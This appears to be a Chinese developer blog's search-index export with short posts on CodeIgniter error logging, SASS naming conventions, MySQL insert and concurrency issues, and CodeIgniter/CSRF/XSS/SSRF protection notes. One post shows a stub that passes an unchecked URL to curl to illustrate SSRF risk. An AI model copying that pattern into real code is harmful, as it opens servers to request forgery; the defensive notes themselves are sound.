的時候竟然沒有紀錄 log … 當初以為是 docker 或 php-fpm 設定的問題 或者 display_error 或 error_reporting 問題 但今天發現是 CI 問題!!!! ","date":"2019-06-03","objectID":"/blog/posts/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/:0:0","tags":["php","nginx"],"title":"PHP CI 框架不會記錄 ERROR 到 nginx log裡解決方案","uri":"/blog/posts/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/"},{"categories":["PHP"],"content":"發現事情不單純 CI 故意寫錯 log，但是 nginx docker 上面竟然就是沒有 log 但發現直連 test.php(非用 CI 框架)正常 這時候我就測試在 index.php 幾行都會記入到 nginx log 但發現放在 index.php 最下面錯誤不會出來 \u003c?php ... require_once BASEPATH.'core/CodeIgniter.php'; 這時候我覺得 Codeigniter 有鬼 有猜到是 Codeigniter.php 裡面的這三行搞鬼 注解掉就可以用了 \u003c?php set_error_handler('_error_handler'); set_exception_handler('_exception_handler'); register_shutdown_function('_shutdown_handler'); 有找一下，set_error_handler It is important to remember that the standard PHP error handler is completely bypassed for the error types specified by error_types unless the callback function returns FALSE. error_reporting() settings will have no effect and your error handler will be called regardless - however you are still able to read the current value of error_reporting and act appropriately. Of particular note is that this value will be 0 if the statement that caused the error was prepended by the @ error-control operator. PHP: set_error_handler - Manual 簡單說就是錯誤，會執行 set_error_handler 但是預設錯誤的 function 不會執行 除非裡面 return false(目前還沒測差過) 不過 CI 沒有記錄 php stderr ，所以導致 CI 沒有紀錄 (PS: 這個是我的猜測) 简述 PHP 的标准输入与输出 | Laravel China 社区 目前猜測可能寫 stderr 會出現到 log 上面 2019-06-04 小記 今天公司小測 使用file_put_contents('php://stderr','this is a log'); 會被 php-fpm 記錄起來，但是 nginx 好像不會收到 目前猜測可能不是從 php-fpm 寫進去… 所以才不會記錄(?) 但已經能解決自行寫入 log 問題 正常接到 php-fpm 的 stderr (nginx docker) thrown in /usr/local/nginx/html/index.php on line 364\" while reading response header from upstream, client: 10.56.158.42, server: localhost, request: \"GET / HTTP/1.1\", upstream: \"fastcgi://192.168.112.8:9000\", host: \"10.56.159.10\", 10.56.158.42 - - [03/Jun/2019:09:42:46 +0000] \"GET / HTTP/1.1\" 200 238 \"-\" \"PostmanRuntime/7.13.0\", 2019/06/03 09:43:36 [error] 6#6: *46 FastCGI sent in stderr: \"PHP message: PHP Fatal error: Uncaught Error: Call to undefined function dffffffffffffff() in /usr/local/nginx/html/index.php:364,\u0002 error_log(’this is a log .’,0); 也能做到一樣的事情 但一樣 nginx 那一邊不會出現 log ，只會在 nginx 不知道為什麼… PHP: error_log - Manual 3 選項可以寫路徑，但感覺會沒有權限寫的感覺 有空試試 CI 有做 set_error_handler http code 500 錯誤 所以可能開啟display_error,1時候 http code 碼會是 200 When display_errors is on it will return 200 always. When display_errors is off it will return 500. Apache/PHP returns HTTP Status Code 200 on error pages - Stack Overflow 就先研究到這邊 redirect php-fpm output to nginx’s error log 最後在CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客 看到真的有人遇到一樣的問題 這個太雷了 冏!!! 其他參考 PHP: 预定义常量 - Manual PHP: restore_error_handler - Manual CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客 ","date":"2019-06-03","objectID":"/blog/posts/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/:1:0","tags":["php","nginx"],"title":"PHP CI 框架不會記錄 ERROR 到 nginx log裡解決方案","uri":"/blog/posts/PHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88/"},{"categories":["SASS"],"content":"最近上課 SASS 這邊記入我可能會忘記的東西 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:0:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"SMACSS 重點 擴充、模組化 Base 不要下 class ，可以用基本樣式 這個地方可參考Pure設計方法 Layout l-grid,l-list (建議不要用語意命名) 每一頁會用到的 class module 每頁重複會用到的元件。如按鈕(.btn) 錯誤範例如下 .btn .btn-blue .btn-blue-large 正確比要適合用 bootstrap 命名 .btn .btn-primary 增加子模組 .l-grid .l-grid h2 ==\u003e .l-grid_title .l-grid ul ==\u003e .l-grid_list 簡單我對 SMCASS 總結，就是做程式切分結構 可參考如下網站 鐵人賽 20 - Sass 資料夾結構 | 卡斯伯 Blog - 前端，沒有極限 base layout module ——以下可看專案大小決定 theme … 更多可參考這篇Sass 7-1 Pattern ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:1:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"OOCSS 結構與樣式分離 容器與內容分離 首先，還是先分清楚什麼是結構?什麼事容器? ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"1.結構、樣式 結構 EX: Bootstrap .btn .btn 這個就是結構 樣式 .btn-lg .btn-primary 這些就是樣式 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:1","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"2.容器、內容 容器 EX: Bootstrap 的.container , col-3 簡單就是排版、網格 內容 EX: Bootstrap 的 .pagination .list-group ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:2","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"OOCSS 好處 增加使用性(reuse) 減少 code 需要注意的事情!! 樣式CSS 不要跟 結構一起寫!!!! 錯誤範例EX: .col-3 .btn 這樣會失去彈性 容器與內容可以玩一下裡面的排版 正常容器裡面可以放容器和內容 完一下可以大概知道這兩個差異 LayoutIt! - Interface Builder for CSS Grid and Bootstrap ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:3","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"我們可能有寫過的 OOCSS 以前我看到有些網站的 CSS 是這樣寫的 ex: .text-left, .mt1, .mt2, .mt3 … 覺得這樣寫也不錯，後來我有些網站也有這樣寫 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:4","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"OOCSS 會有什麼缺點 不好的話，html 的 class 東西可能會越來越多 這時候我覺得可以看情況是不是需要用 module ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:2:5","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"BEM BEM 的意思是區塊（Block）、元素（Element）、修飾符（Modifier） ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:3:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"Block 這邊覺得簡單講就是一個 module(模組) EX: .card,.list__item __這邊規定說只能放一個，能放多個 這邊有一個重點 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:3:1","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"Element 一個 Block 可以放多個 Element。我簡單說他是子模組。 在使用 Element .list__item__img .list__item__title .list__item__content ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:3:2","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"Modifier 簡單就是說(子)模組狀態 正常會在 Modifier 放-- ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:3:3","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"符號__跟– 沒有強制規定 BEM 符號可以看公司規定做調整 最近剛好看到巴哈論壇他們的 CSS 好像是這樣設計的 但他們符號沒有跟 BEM 用一樣 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:3:4","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"設計模式總結 最後紀錄三個設計 CSS 設計模式 設計不一定要同時用三個 選擇上可以參考上面三個設計 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:4:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"其他紀錄 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:5:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"CSS 盡量不要超過 3 層 EX: .header nav ul li a 這樣太多層了 可以改成 nav li a 原因效能上也會有關係，管理上也比較麻煩 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:5:1","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"為什麼有些.container 裡面會包.wrap? 有時候.wrap 裡面某些元件可能需要做致中 可以搭配.wrap 操作置中 會比較方便 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:5:2","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"盡量不要寫 a.logo .header .logo a .header a.logo 寫 CSS 不要指定 html tag 跟 class 連在一起 這樣有失彈性 這上面還有一個問題 logo 不可能出現 header 上面 所以可以用 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:5:3","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"SASS 使用變數技巧 不要用語意 錯誤範例 EX: .booksList,.carsList 這樣明明這些都是一樣東西 但每頁應該可以套同一個 CSS class 如: .list, .l-list(可以家前綴) 使用變數技巧 $red: red; $body-color: $red; 這樣網站在改顏色的時候非常好調整 可以參考 bootstrap 原碼 bootstrap/_variables.scss at master · twbs/bootstrap 語意的部分還是交給 html 吧 backimage 圖片沒有重複使用，也不要用成變數 除非有特別關係(通常應該不會) 利用變數技巧一次產生多個 class 方法 bootstrap/_utilities.scss at master · twbs/bootstrap ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:5:4","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"結構辨別的種類 佈局 layout、頁面 page (只出現一處) 工具 helper、utilities 模組 module (出現兩處以上) 容器 container、grid ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:6:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"其他寫 CSS 可能需要注意的事情 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:7:0","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"float 做響應式可能需要注意的事 .fl{ float:left; } 但需要注意到手機全版建議取消 float ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:7:1","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"少指定 width,height 數值 使用格線系統具有彈性 ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:7:2","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["SASS"],"content":"其他使用 SASS 技巧 容器單一寫 CSS 錯誤範例 ex: .col-3 .col-12 .col-12 .img 正確寫法 .col-12 .img ####前綴可以對應放置 SASS 資料夾 .p-about 放在 page .l-list 放在 layout 再找 CSS 位置會特別直覺 使用 page 做每頁分類 不要寫出多份 SASS(產生多個 css ex:about.css home.css) 只需要寫一個 SASS(產生一個 css ex:all.css) 這個好處在拆分 css 模組化會比較有幫助 page module 比較 page vs module page 只有當頁有用到 module 有很多頁會用到 不知道歸類方法 在不知道要放在哪邊情況下 可以先放在inbox資料夾 方便以後知道後再做移轉 最後思考 是否能將 Layout 與 Page 重構為 module? 先記錄這樣…，我還有格線系統沒紀錄 orz ","date":"2019-06-02","objectID":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/:7:3","tags":["css"],"title":"SASS 學習小記","uri":"/blog/posts/SASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"最近做 INSERT 很簡單語法 但竟然出錯 印象中 DB2 以前這樣下沒有這個問題 錯誤訊息如下： Table 'test' is specified twice, both as a target for 'INSERT' and as a separate source for data You can't specify target table 'basic_data' for update in FROM clause ex: INSERT INTO data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin) VALUES (1, 1, (SELECT DATE_ADD(max(tanggal_vaksin), INTERVAL 1 YEAR)) FROM data_waktu_vaksinasi, 'belum') 爬了一些網站有找到解法 解决 mysql 不能修改（You can’t specify target table ‘basic_data’ for update in FROM clause） - winter13292 的专栏 - CSDN 博客 mysql - table is specified twice both as a target for INSERT and as separate source of data - Stack Overflow 1093 Error in MySQL table is specified twice - Stack Overflow INSERT INTO data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin) SELECT 1, 1, DATE_ADD(max(tanggal_vaksin), INTERVAL 1 YEAR), 'belum' FROM data_waktu_vaksinasi; 或外面包一個 SELECT 解决 mysql 不能修改（You can’t specify target table ‘basic_data’ for update in FROM clause） - winter13292 的专栏 - CSDN 博客 也有看到 join 方式解決 mysql: you can’t specify target table 问题解决 - weixin_42608550 的博客 - CSDN 博客 其他小記 如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客 ","date":"2019-06-02","objectID":"/blog/posts/MySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql"],"title":"MySQL(MariaDB) insert有關做相同表會遇到問題小記","uri":"/blog/posts/MySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"小記…，有時間補 設計資料表 unique 這個是我想的，不過網路上感覺很少寫用這個方法 但還是有找到少數人有在討論 好像滿可行的 用 DB unique 可以預防同時資料問題 或者有限制 enum=[1,2,3] 每次資料進來可預防這個問題 但是做刪除，在加入可能就比較麻煩 鎖表 select …. for update; 待研究 redis 網路爬到有用 redis 解決，有時間在理解 使用 Redis SETNX 命令实现分布式锁 - Leo 的博客 - CSDN 博客 高并发场景下数据重复插入的问题 - LEON 的博客 - CSDN 博客 如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客 高并发时，进行 insert 操作出现重复记录问题分析 - hansam 的专栏 - CSDN 博客 java 解决分布式环境中 高并发环境下数据插入重复问题 - 天才白痴梦 - CSDN 博客 并发写数据库如何避免重复数据-CSDN 论坛 如何用DB抗住大量读写的业务 – fishermartyn.github.io 处理高并发情况下的DB插入 - isWTF’s blog ","date":"2019-06-01","objectID":"/blog/posts/MySQL-%E9%AB%98%E4%BD%B5%E7%99%BC%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","lock"],"title":"MySQL 高併發問題解決小記","uri":"/blog/posts/MySQL-%E9%AB%98%E4%BD%B5%E7%99%BC%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E5%B0%8F%E8%A8%98/"},{"categories":null,"content":"小記 有空實驗，再回去補實做 php - How to know if MySQLnd is the active driver? - Stack Overflow Advanced Read/Write Splitting with PHP’s MySQLnd mysqlnd 彙整 - Joe Horn 的啟示錄 《第 28 天》MySql 讀寫分離，及資料庫高可用負載均衡的實現 - 每日頭條 【mysql 读写分离】10 分钟了解读写分离的作用 - 赖德发的博客 - CSDN 博客 mysql 叢集技術：主從複製，讀寫分離 | 程式前沿 bitnami-docker-mysql/docker-compose-replication.yml at master · bitnami/bitnami-docker-mysql docker 實做 Mysql master salve Mysql Master/Slave Replication With Docker · Issue #1 · Junnplus/blog 其他小記 開源內網 DNS 服務器軟件介紹 - 台部落 2020-06-13 最近開始寫 Java JDBC 可設定 master slave MySQL :: MySQL Connector/J 5.1 Developer Guide :: 8.3 Configuring Master/Slave Replication with Connector/J spring - Mysql master/slave replication .Connect to master even for read queries? (does Driver “ping” master before going to slave?) - Stack Overflow 讨论一下基于Master-Slave数据库模式的J2EE开发的框架选择 - Hibernate - Java - ITeye论坛 ","date":"2019-06-01","objectID":"/blog/posts/MySQLnd-%E5%B0%8F%E8%A8%98/:0:0","tags":null,"title":"MySQLnd 小記","uri":"/blog/posts/MySQLnd-%E5%B0%8F%E8%A8%98/"},{"categories":["Codeigniter"],"content":"最近專案由於有 QA 團隊檢查安全性 所以這邊紀錄一下最近專案用 Codeigniter 上一篇有紀錄到一些安全性 CSRF , SSRF , XSS 有關網頁安全小記 | 程式狂想筆記 ","date":"2019-06-01","objectID":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/:0:0","tags":["codeigniter","php"],"title":"Codeigniter 安全性小記","uri":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/"},{"categories":["Codeigniter"],"content":"SQL 需要注意安全性問題 首先，講一下 SQL INJECTION 假如要放 SQL 進去查詢，但是複雜的功能平常不可能用 bind 用 ? 去套 所以再用 變數串 SQL 的時候可能就會有危險的問題，但是不能用 bind 這時候需要加 escape 或 escape_str 原始碼可以參考這個CodeIgniter/DB_driver.php at 7ec458b45316b9f270e1e03de498244f71c605ea · bcit-ci/CodeIgniter $str = array_map(array(\u0026$this, 'escape'), $str); PHP 的 array function 的運用真的 千變萬化 首先講一下 escape 的小雷 看了一下 Code 想說這兩個功能都一樣 不過escape接到 string 型態 外面會自動加'單引號 雖然不知道為什麼 所以為什麼limit ?不能用 bind 原因可能是 escape 會有問題(會變成 limit ‘2’) 所以在用的時候需要小心 ","date":"2019-06-01","objectID":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/:1:0","tags":["codeigniter","php"],"title":"Codeigniter 安全性小記","uri":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/"},{"categories":["Codeigniter"],"content":"XSS 小心 常常在網路上看到，通常都是用 JS 攻擊 所以需要做 XSS 過濾 當然輸入要過濾\u003cscript\u003e 輸出的是要做htmlspecialchar Codeigniter 沒有現代化框架好用東西，如{{ var_str }} 但是還是有好用的工具，如 html_escape 相關程式原碼 CodeIgniter/Common.php at 07cb9fd45f94d928c0f6dcf73f702808e1e03f62 · bcit-ci/CodeIgniter 使用上除了可以塞 string 外 他還可以塞 array 會把所有內容做過濾 xss_clean() 可以過濾\u003cscript\u003e 但是注意！！這個不是在過濾 HTML tag(ex: \u003cimg\u003e,\u003ca\u003e) $data = $this-\u003esecurity-\u003exss_clean($data); 當然 img 也會有這個問題 如這篇 CheatSheetSeries/Cross_Site_Scripting_Prevention_Cheat_Sheet.md at master · OWASP/CheatSheetSeries ","date":"2019-06-01","objectID":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/:2:0","tags":["codeigniter","php"],"title":"Codeigniter 安全性小記","uri":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/"},{"categories":["Codeigniter"],"content":"圖片也要注意 XSS 攻擊 if ($this-\u003esecurity-\u003exss_clean($file, TRUE) === FALSE) { // file failed the XSS test } $this-\u003einput-\u003eget(xxx , TRUE ); ","date":"2019-06-01","objectID":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/:2:1","tags":["codeigniter","php"],"title":"Codeigniter 安全性小記","uri":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/"},{"categories":["Codeigniter"],"content":"SSRF 安全過濾 在寫 call curl API 需要安全行確認 是不是參數是安全的 例如 \u003c?php function callAPI($url){ ... curl($url) } 上面 code 不能跑 這就會有 SSRF 問題 聽說 Server 端也能處理這個問題 CodeIgniter 的数据安全过滤全解析 - Just Code - ITeye 博客 深入探討 CodeIgniter Input Class 核心程式流程 | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY ","date":"2019-06-01","objectID":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/:3:0","tags":["codeigniter","php"],"title":"Codeigniter 安全性小記","uri":"/blog/posts/Codeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"最近看到相關網頁安全東西 XSS,CSRF 我也比較長看到 但是 SSRF 就沒什麼聽過 筆記筆記 找到資訊 【庖丁解牛】CSRF 和 SSRF，是如何攻防？ - 知乎 XSS,CSRF,SSRF 三种漏洞的区别和共同点 - 18 年 3 月萌新白帽子 - CSDN 博客 csrf 以及 ssrf - 简书 SSRF 服务端请求伪造 - CTF Wiki 傳接 API 需不需要加入 CSRF 判斷 所以查了一篇 好像也沒有一定答案 但有說串接 API 需要帶 Key 请教大家 app 接口需要防护 csrf 吗？ · Ruby China 無相關小記 WWDC 中提到的浏览器 Fingerprinting 有多可怕？ - 掘金 資料庫讀寫分離架構實踐 | 程式前沿 有時間找到再補充 2019-07-01 最近用 CI 做 CSRF 在頁面 form 和 ajax 做 CSRF PS: $config['csrf_protection'] = TRUE; 設定 方法是用data: {'\u003c?php echo $this-\u003esecurity-\u003eget_csrf_token_name(); ?\u003e':'\u003c?php echo $this-\u003esecurity-\u003eget_csrf_hash(); ?\u003e' 但在 SPA 做 CSRF 就會遇到 token 過期 因為 CSRF token 只能用一次 這個一不小心就踩到的問題 codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce’S Note 網路找幾個方案 Cookies 來抓 CSRF，因為 CSRF 是從 cookies 那邊設定 $(function() { $(\"#btn\").click(function() { $.ajax({ type: \"POST\", url: \"/ajax\", //ajax接收的server端 data: $(\"#form\").serialize() + \"\u0026csrf_test_name=\" + getCookie(\"csrf_test_name\"), success: function(data) { alert(data.msg); }, dataType: \"json\" }); }); }); function getCookie(name) { var arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\")); if (arr != null) return unescape(arr[2]); return null; } Codeigniter 開啟 csrf protection 時 傳送表單(or ajax) | [lifeIs: tooShort to: waste] ","date":"2019-05-26","objectID":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["CSRF","SSRF","XSS"],"title":"CSRF , SSRF , XSS 有關網頁安全小記","uri":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"Laravel AJAX 解法 先說說一般用法 @csrf $.ajaxSetup({ headers: { \"X-CSRF-TOKEN\": \"{{ csrf_token() }}\" } }); \u003cmeta name=\"_token\" content=\"{{ csrf_token() }}\" /\u003e 再用 js $.ajaxSetup({ headers: { 'X-CSRF-TOKEN': $('meta[name=\"_token\"]').attr('content') } }); 從 cookie 那邊得來 CSRF，跟上面 CI 方法很像，異曲同工之妙。 $.ajaxSetup({ headers: { \"X-XSRF-TOKEN\": $.cookie(\"XSRF-TOKEN\") } }); 我同事有找到一篇，先打 ajax 取 csrf，在發送表單… 不過我們都覺得不優 XD PS: Laravel 會把 CSRF 寫在 XSRF-TOKEN 讓我們來談談 CSRF - Huli’s blog 備份圖 Laravel 中 Ajax 调用时的 CSRF 对策 – 目光博客 CSRF 保护 |《Laravel 5.5 中文文档》| Laravel China 社区 codeigniter 使用 CSRF Token 含 AJAX 驗證 – Bryce’S Note ","date":"2019-05-26","objectID":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/:0:1","tags":["CSRF","SSRF","XSS"],"title":"CSRF , SSRF , XSS 有關網頁安全小記","uri":"/blog/posts/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/"},{"categories":["程式心法"],"content":"AXIOS 搭配用 Laravel AJAX 免設定 axios/axios: Promise based HTTP client for the browser and node.js // `xsrfCookieName` is the name of the cookie to use as a value for xsrf token xsrfCookieName: 'XSRF-TOKEN', // default // `xsrfHeaderName` is the name of the http header that carries the xsrf token value xsrfHeaderName: 'X-XSRF-TOKEN', // default 設定 axios，可以不需要設定 CSRF 前端套件幫你處理了 XD 我覺得有空來實作看看 2019-07-05 今天看到 IE 的一个通用 Cookie 跨域漏洞 - 知乎 讓我們來談談 CSRF · Issue #16 · aszx87410/blog twtrubiks/CSRF-tutorial: Use Django To Introduce CSRF and Cookies , Session 📝 講到 Synchronizer Token Pattern ( STP ) Double Submit Cookie 其中的\"某些 CSRF 防禦\"特指 Double Cookie Submit。（雙 Cookie 遞交認證，指的是在 GET 參數及 HTTP 請求中同時包含一個隨機的字符串，如果服務器判斷 GET 參數和 Cookie 參數相等，那麼沒有受到 CSRF 攻擊）由於這是 OWASP 欽定的防禦方法，人們往往會忽略 IE Cookie 漏洞對其的繞過。 IE 的一個通用 Cookie 跨域漏洞 - 知乎 這個寫得很清楚是什麼意思 我覺寫得不錯!! 